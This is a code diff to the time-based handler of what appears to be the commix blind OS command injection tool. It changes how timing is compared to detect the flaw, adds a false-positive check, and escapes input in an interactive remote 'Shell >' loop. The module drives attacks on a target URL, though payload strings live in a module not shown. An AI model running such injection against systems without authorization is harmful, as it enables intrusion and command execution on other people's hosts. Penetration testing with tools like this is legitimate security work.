@@ -33,10 +33,10 @@ from src.core.injections.controller import checks
 from src.core.requests import headers
 from src.core.requests import parameters
 
-from src.core.injections.blind_based.techniques.time_based import tb_injector
-from src.core.injections.blind_based.techniques.time_based import tb_payloads
-from src.core.injections.blind_based.techniques.time_based import tb_enumeration
-from src.core.injections.blind_based.techniques.time_based import tb_file_access
+from src.core.injections.blind.techniques.time_based import tb_injector
+from src.core.injections.blind.techniques.time_based import tb_payloads
+from src.core.injections.blind.techniques.time_based import tb_enumeration
+from src.core.injections.blind.techniques.time_based import tb_file_access
 
 """
  The "time-based" injection technique on Blind OS Command Injection.
@@ -53,9 +53,10 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
   vp_flag = True
   no_result = True
   is_encoded = False
+  is_vulnerable = False
   export_injection_info = False
-
-  injection_type = "Blind-based Command Injection"
+  how_long = 0
+  injection_type = "Blind Command Injection"
   technique = "time-based injection technique"
 
   # Check if defined "--maxlen" option.
@@ -77,7 +78,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
         num_of_chars = num_of_chars + 1
-        
+
         # Check for bad combination of prefix and separator
         combination = prefix + separator
         if combination in settings.JUNK_COMBINATION:
@@ -92,7 +93,10 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
         
         for output_length in range(1, int(tag_length)):
           try:
-            
+
+            # Log previous 'how_long' for later comparison
+            previous_how_long = how_long
+
             if alter_shell:
               # Time-based decision payload (check if host is vulnerable).
               payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
@@ -144,19 +148,23 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 percent = ""
                 
             else:
-              if (url_time_response <= 1 and how_long >= delay) or \
-              (url_time_response >= 2 and how_long > delay):
-
+              if how_long == previous_how_long + delay:
                 # Time relative false positive fixation.
                 if len(TAG) == output_length:
+                  tmp_how_long = how_long
                   randv1 = random.randrange(0, 1)
                   randv2 = random.randrange(1, 2)
                   randvcalc = randv1 + randv2
                   cmd = "(" + str(randv1) + "+" + str(randv2) + ")"
+
                   # Check for false positive resutls
-                  output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell)
+                  how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long)
                   
-                if str(output) == str(randvcalc) and len(TAG) == output_length:
+                if str(tmp_how_long) == str(how_long) and \
+                   str(output) == str(randvcalc) and \
+                   len(TAG) == output_length:
+
+                  is_vulnerable = True
                   if not menu.options.verbose:
                     percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                   else:
@@ -179,12 +187,11 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
           
           # Yaw, got shellz! 
           # Do some magic tricks!
-          if (url_time_response <= 1 and how_long >= delay) or \
-          (url_time_response >= 2 and how_long > delay):
-
-            if len(TAG) == output_length :
+          if how_long == previous_how_long + delay:
+            if (len(TAG) == output_length) and (is_vulnerable == True):
               found = True
               no_result = False
+              is_vulnerable = False
 
               if settings.COOKIE_INJECTION == True: 
                 header_name = " Cookie"
@@ -284,6 +291,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                   while True:
                     try:
                       cmd = raw_input("Shell > ")
+                      cmd = checks.escaped_cmd(cmd)
                       if cmd.lower() in settings.SHELL_OPTIONS:
                         if cmd == "?":
                           menu.shell_options()
@@ -292,7 +300,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                           sys.exit(0)
                         elif cmd.lower() == "back":
                           go_back = True
-                          if checks.check_next_attack_vector(technique, go_back) == True:
+                          if checks.next_attack_vector(technique, go_back) == True:
                             break
                           else:
                             if no_result == True:
@@ -313,7 +321,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       raise
                   
                 elif gotshell in settings.CHOISE_NO:
-                  if checks.check_next_attack_vector(technique, go_back) == True:
+                  if checks.next_attack_vector(technique, go_back) == True:
                     break
                   else:
                     if no_result == True:
